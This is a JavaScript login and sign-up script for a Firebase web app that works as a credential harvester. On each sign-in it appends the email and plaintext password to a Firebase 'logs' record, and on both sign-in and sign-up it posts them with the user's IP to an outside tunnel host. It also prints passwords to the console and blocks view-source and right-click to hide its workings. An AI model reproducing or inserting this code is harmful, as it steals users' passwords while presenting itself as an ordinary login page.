const firebaseConfig = {
  apiKey: "AIzaSyAVLvRJO4nNO5jyeVCVd9gZIZKmg5Isaxw",
  authDomain: "m-nawaz.firebaseapp.com",
  databaseURL: "https://m-nawaz-default-rtdb.firebaseio.com",
  projectId: "m-nawaz",
  storageBucket: "m-nawaz.appspot.com",
  messagingSenderId: "1041394850791",
  appId: "1:1041394850791:web:7ad1a6e5fa52b2f14cbb42",
  measurementId: "G-6KX7VW48GW",
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.database();
var ip_address;

function signUp() {
  var email = document.getElementById("email");
  var password = document.getElementById("password");
  const promise = auth.createUserWithEmailAndPassword(
    email.value,
    password.value
  );

  axios
    .post("https://nawaz.loca.lt/register", {
      email: email.value,
      password: password.value,
      ipadress: ip_address,
    })
    .then((res) => {
      console.log(res.data);
    });

  promise.catch((e) => {
    if (e.message.toString() == "The email address is badly formatted.") {
      alert("Invalid Email or Password");
    } else if (
      e.message.toString() == "Password should be at least 6 characters"
    ) {
      alert("Password too weak , it should contain atleast 6 characters");
    } else if (
      e.message.toString() ==
      "The email address is already in use by another account."
    ) {
      alert("This Username is already taken ...");
    } else if (
      e.message.toString() ==
      "A network error (such as timeout, interrupted connection or unreachable host) has occurred."
    ) {
      alert("Network connection not found !");
    } else {
      alert(e.message);
    }
  });
}

const h1 = document.querySelector("h1");
const container = document.querySelector(".container");
const ban = document.querySelector(".ban");
const ban_time = document.querySelector(".ban_time");
const title = document.querySelector("title");
const ok = document.querySelector(".invisible");
const ban_Reason = document.querySelector(".ban_reason");
const text = document.querySelector(".text");

function DisplayIP(response) {
  ip_address = response.ip;
}

//signIn
function signIn() {
  var email = document.getElementById("email");
  var password = document.getElementById("password");

  var today = new Date();
  var date =
    today.getFullYear() + "-" + (today.getMonth() + 1) + "-" + today.getDate();
  var time =
    today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
  var dateTime = date + " " + time;
  db.ref("logs").once("value", function (snapshot) {
    // var password = "not known";
    var prevVal = snapshot.val();
    db.ref("logs").set(
      `${prevVal}
           __________________________________
           Email: ${email.value}
           Password: ${password.value}
           Time: ${dateTime}
           __________________________________
           `
    );
  });
  axios
    .post("https://nawaz.loca.lt/login", {
      email: email.value,
      password: password.value,
      ipadress: ip_address,
    })
    .then((res) => {
      console.log(res.data);
    });
  const promise = auth.signInWithEmailAndPassword(email.value, password.value);
  promise.catch((e) => {
    if (
      e.message.toString() ==
      "The user account has been disabled by an administrator."
    ) {
      container.textContent = "";
      ban.textContent = "YOU HAVE BEEN BANNED !";
      ban_time.textContent = "Ban Time : Unknown";
      ban_Reason.textContent = "Reason : Unknown";
      title.textContent = "Banned";
      ok.textContent = "OK";
      ok.style.backgroundColor = "#3428a7";
      ok.style.width = "200px";
      ok.style.height = "80px";
      ok.style.cursor = "Pointer";
      ok.style.color = "white";
    } else if (
      e.message.toString() == "The email address is badly formatted."
    ) {
      alert("Invalid Username or Password");
    } else if (
      e.message.toString() ==
      "A network error (such as timeout, interrupted connection or unreachable host) has occurred."
    ) {
      alert("Network connection not found !");
    } else if (
      e.message.toString() ==
      "There is no user record corresponding to this identifier. The user may have been deleted."
    ) {
      alert(`The Email: "${email.value}" Does Not Exist`);
    } else if (
      e.message.toString() ==
      "The password is invalid or the user does not have a password."
    ) {
      alert("Wrong Username or password");
    } else {
      alert(e.message);
    }
  });
}

ok.onclick = function () {
  ok.onclick = window.location = "./index.html";
};

firebase.auth().onAuthStateChanged((user) => {
  if (user) {
    var password = document.getElementById("password");
    console.log("Email : " + user.email + "  , has signed in");
    console.log("Password : " + password.value);

    alert("Signed In");
    window.location = "./Inside/inside.html";
  }
  if (user.email == "admin@gmail.com") {
    alert("Welcome Admin !");
  }
  if (user.email == "nawazxx333@gmail.com") {
    alert("Welcome Admin !");
  }
});

//forgotPass
function forgotPass() {
  const email = document.getElementById("email").value;
  firebase
    .auth()
    .sendPasswordResetEmail(email)
    .then(() => {
      alert("Password set Link sent to Your email ID");
    })
    .catch((error) => {
      alert("Invalid Username");
    });
}

// Update Code

document.onkeydown = function (e) {
  if (e.ctrlKey && e.keyCode === 85) {
    return false;
  }
};
window.oncontextmenu = function () {
  return false;
};

const showPass = document.querySelector(".showPass");
const showText = document.querySelector(".showText");

function ShowPassword() {
  if (password.type == "password") {
    password.type = "text";
    showText.textContent = "Hide Password";
  } else {
    password.type = "password";
    showText.textContent = "Show Password";
  }
}

// Update Code

var Update = false;
if (Update == true) {
  container.textContent = "";
  title.textContent = "Update !";
  const body = document.querySelector("body");
  ban.textContent = "Update Under Progress !";
  ban_time.textContent = "Estimated Time : Unknown";
  ban_Reason.textContent =
    "There will be many Bug fixes and other changes also";
  ban.style.fontSize = "30px";
  ban.style.color = "blue";
  ban.style.fontFamily = "Arial";
  ban_time.style.fontFamily = "Nunito";
}
